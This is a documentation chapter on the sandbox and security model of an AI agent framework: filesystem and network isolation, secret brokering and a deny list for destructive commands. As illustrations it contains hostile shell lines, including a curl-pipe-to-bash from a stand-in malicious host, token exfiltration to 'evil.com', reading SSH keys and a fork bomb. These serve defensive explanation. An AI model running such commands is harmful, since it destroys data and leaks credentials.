# Chapter 06: Sandbox & Security Model

## Why Sandboxing Matters

An AI agent with terminal access is powerful — and dangerous. Consider what a single `sys_os_shell` call can do:

- `rm -rf $HOME/projects` — delete your work
- `curl evil.site/backdoor.sh | bash` — install malware
- `git push --force origin main` — rewrite shared history
- `cat ~/.ssh/id_rsa` — exfiltrate private keys

Traditional agent CLIs run as your user, with your permissions, in your home directory. Omnigent's **Omnibox** sandbox adds a security layer between the agent and your OS.

## The Omnibox Architecture

```
┌──────────────────────────────────────────────┐
│                 AGENT (LLM)                    │
│                                                │
│  "I'll write a file and run a command"         │
└──────────────────┬───────────────────────────┘
                   │ tool call: sys_os_write("/etc/passwd", ...)
                   ▼
┌──────────────────────────────────────────────┐
│              OMNIBOX INTERCEPTOR               │
│                                                │
│  1. Check: is /etc/passwd in write_paths?      │
│  2. Check: is this a blocked pattern?          │
│  3. Map path: /etc/passwd → sandbox/etc/passwd │
│  4. Execute in sandbox namespace               │
│  5. Return result (or error if denied)         │
└──────────────────┬───────────────────────────┘
                   │ ALLOW: execute in sandbox
                   │ DENY:  return error to agent
                   ▼
┌──────────────────────────────────────────────┐
│              HOST FILESYSTEM                   │
│  (only paths allowed by write_paths/read_paths) │
└──────────────────────────────────────────────┘
```

## Sandbox Backends

Omnigent uses OS-native sandboxing, not Docker containers:

| Platform | Backend | Install |
|---|---|---|
| **Linux** | `bubblewrap` (`bwrap`) | `apt install bubblewrap` |
| **macOS** | `seatbelt` (built-in) | None — ships with macOS |
| **Cloud** | Modal / Daytona / Islo | Provisioned by Omnigent |

### Why Not Docker?

Docker is heavy — pulling images, managing daemons, mounting volumes. Bubblewrap (`bwrap`) creates lightweight Linux namespaces without a daemon, in milliseconds. Seatbelt on macOS uses the built-in sandbox framework. Both are **process-level** isolation — no container orchestration needed.

## Sandbox Modes

### 1. None (Unsandboxed)

```yaml
os_env:
  type: caller_process
  cwd: .
  sandbox:
    type: none
```

**Use case:** Trusted local development, your own machine, you're the one driving the agent.

**Risk:** Agent has your full user permissions. A prompt injection could read SSH keys, delete files, push to production.

### 2. Local Sandbox

```yaml
os_env:
  type: caller_process
  cwd: .
  sandbox:
    type: linux_bwrap          # or: darwin_seatbelt
    write_paths:
      - ./output
      - /tmp/omnigent
    read_paths:
      - ./src
      - ./tests
      - ./data
    allow_network: true        # or false
```

**Use case:** Team server, untrusted agents, CI/CD, shared development.

**Risk surface:** Only paths you explicitly allow. Network can be toggled off entirely.

### 3. Cloud Sandbox

```yaml
os_env:
  type: managed_host
  host: modal                  # or: daytona, islo
  sandbox:
    type: linux_bwrap
    write_paths: [./output]
    allow_network: true
```

**Use case:** No local compute needed, max isolation, reproducible environments.

**Risk surface:** Cloud host's isolation model. Modal and Daytona are ephemeral VMs — destroyed after session.

## Secret Brokering

This is Omnigent's most interesting security feature. The problem:

```
Agent has API keys in its environment
  → Agent can read them with sys_os_shell("echo $GITHUB_TOKEN")
  → Agent can exfiltrate them: curl evil.com?token=$GITHUB_TOKEN
```

The solution: **secrets are never in the agent's environment.**

```
┌────────────────────────────────────────┐
│  AGENT'S ENVIRONMENT                    │
│  HOME=/sandbox/home                     │
│  PATH=/usr/bin                          │
│  (no GITHUB_TOKEN, no ANTHROPIC_API_KEY) │
└────────────────────────────────────────┘
                    │
                    │ agent runs: git push origin main
                    ▼
┌────────────────────────────────────────┐
│  EGRESS PROXY                           │
│                                         │
│  Detect: "git push" → needs GitHub token │
│  Check: is this approved?               │
│  Inject: GITHUB_TOKEN=ghp_... at egress  │
│  Forward: request to github.com          │
└────────────────────────────────────────┘
```

The agent never sees the token. It only gets injected at the network boundary, and only for approved operations.

## Configuring Sandbox Access

### Filesystem

```yaml
sandbox:
  write_paths:
    - ./output           # relative to cwd
    - /tmp/omnigent       # absolute
  read_paths:
    - ./                  # entire project (read-only)
    - /usr/share/data     # shared data
  # Paths NOT listed are invisible to the agent
```

### Network

```yaml
sandbox:
  allow_network: true      # agent can reach internet
  # or
  allow_network: false     # agent is air-gapped

  # Fine-grained (future / custom policies):
  allowed_domains:
    - github.com
    - api.openai.com
    - pypi.org
```

### Environment Variables

```yaml
os_env:
  type: caller_process
  env:                        # explicit allowlist
    FOO: bar                  # literal value
    NODE_ENV: development
    # Variables NOT listed are NOT passed to agent
```

## Security Posture by Use Case

| Scenario | Sandbox | Network | Filesystem | Secrets |
|---|---|---|---|---|
| **Personal dev, trusted agent** | `none` | true | `./` | In env |
| **Team agent on shared server** | `linux_bwrap` | true | `./output` only | Brokered |
| **CI/CD agent** | `linux_bwrap` | true | `./build` only | Brokered |
| **Untrusted third-party agent** | `linux_bwrap` | false | `/tmp/omnigent` only | Brokered |
| **Agent that only reads docs** | `linux_bwrap` | false | `./docs` (read-only) | None needed |

## The Blast Radius Policy

Complementing the sandbox, Omnigent ships with a blast-radius guardrail that catches catastrophic operations even in unsandboxed mode:

```yaml
guardrails:
  policies:
    blast_radius:
      type: function
      function:
        path: omnigent.inner.nessie.policies.blast_radius
        arguments:
          gate_pushes: true    # false = skip ASK on regular push
```

**Always DENIED (even with `gate_pushes: false`):**
- `rm -rf /` and variants
- `git push --force` to any remote
- `git reset --hard` to a remote ref
- `chmod -R 777 /`
- `:(){ :|:& };:` (fork bomb)

**ASK when `gate_pushes: true`:**
- `git push` (non-force)
- `git merge`
- `npm publish`
- `docker push`

## Concrete Example: Locking Down an Agent

```yaml
name: sandboxed_coder
prompt: You write code for the project. You can read any source file,
        write to ./src and ./tests, and run tests.

executor:
  harness: claude-sdk
  model: claude-sonnet-4-6

os_env:
  type: caller_process
  cwd: .
  sandbox:
    type: linux_bwrap
    write_paths:
      - ./src
      - ./tests
      - ./build
    read_paths:
      - ./src
      - ./tests
      - ./docs
      - ./pyproject.toml
    allow_network: true       # needs PyPI for testing

policies:
  safe_shell:
    type: function
    handler: omnigent.policies.builtins.safety.ask_on_os_tools

guardrails:
  policies:
    blast_radius:
      type: function
      function:
        path: omnigent.inner.nessie.policies.blast_radius
        arguments:
          gate_pushes: true
```

**What this agent CAN do:**
- Read any source/test/doc file
- Write to ./src, ./tests, ./build
- Run shell commands (after your approval, thanks to `ask_on_os_tools`)
- Access PyPI (network allowed)
- Git operations (push/merge require approval via blast_radius)

**What this agent CANNOT do:**
- Read `~/.ssh`, `.env`, `~/.aws` (not in read_paths)
- Write anywhere except ./src, ./tests, ./build
- Force-push, `rm -rf /`, fork bomb (blast_radius always DENIES)
- See any API keys (they're not in the sandbox environment)

## Summary

Omnigent's security model operates at three layers:

1. **Policy engine** — declarative rules (spend caps, tool limits) — *what* the agent may do
2. **Sandbox (Omnibox)** — OS-level isolation — *where* the agent may operate
3. **Secret brokering** — keys injected at egress, never visible — *how* the agent authenticates

The design principle: **never rely on the model to behave.** Prompts can be jailbroken, models hallucinate, and adversarial inputs exist. Policies and sandboxes are code — they don't care what the model "promised."

---

**Previous:** [Chapter 05 — Policies & Governance](./05_policies_and_governance.md)
**Next:** [Chapter 07 — Collaboration & Multi-Device](./07_collaboration_and_sharing.md)
